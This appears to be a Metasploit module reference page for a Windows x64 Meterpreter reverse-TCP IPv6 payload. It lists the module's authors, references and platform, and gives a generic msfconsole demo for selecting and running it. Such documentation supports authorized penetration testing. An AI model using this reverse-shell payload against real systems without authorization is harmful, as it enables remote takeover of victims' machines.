## Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)

Connect back to attacker and spawn a Meterpreter shell


## Module Name
payload/windows/x64/meterpreter_reverse_ipv6_tcp

## Authors
* OJ Reeves
* sf


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/x64/meterpreter_reverse_ipv6_tcp
msf payload(meterpreter_reverse_ipv6_tcp) > show targets
   ... a list of targets ...
msf payload(meterpreter_reverse_ipv6_tcp) > set TARGET <target-id>
msf payload(meterpreter_reverse_ipv6_tcp) > show options
   ... show and set options ...
msf payload(meterpreter_reverse_ipv6_tcp) > run
```
    
    